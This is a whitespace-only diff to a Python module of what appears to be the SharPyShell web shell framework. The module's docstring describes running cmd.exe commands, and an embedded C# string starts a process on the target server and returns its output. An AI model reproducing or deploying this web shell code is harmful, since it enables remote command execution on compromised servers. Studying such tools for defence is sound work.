@@ -15,14 +15,14 @@ class Exec_cmd(Module):
         of the process.
         Note that you should use the 'cd' command of the prompt to change your working directory.
         You should never use '#exec_cmd cd C:\dir', but instead 'cd C:\dir'.
-    
+
         Usage:
             #exec_cmd os_command [args]
-            
+
         Positional arguments:
             os_command               command supported by cmd.exe
             args                     the commandline arguments to be passed
-            
+
         Examples:
             List current directory files:
                 #exec_cmd dir
@@ -33,7 +33,7 @@ class Exec_cmd(Module):
     _runtime_code = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell
-                {                    
+                {
                     string ExecCmd(string arg, string working_path)
                     {
                         ProcessStartInfo pinfo = new ProcessStartInfo();
@@ -63,7 +63,7 @@ class Exec_cmd(Module):
                             output = "{{{SharPyShellError}}}\n" + output + stand_errors;
                         return output;
                     }
-                    
+
                     public byte[] ExecRuntime()
                     {
                         string output_func=ExecCmd(@"%s", @"%s");
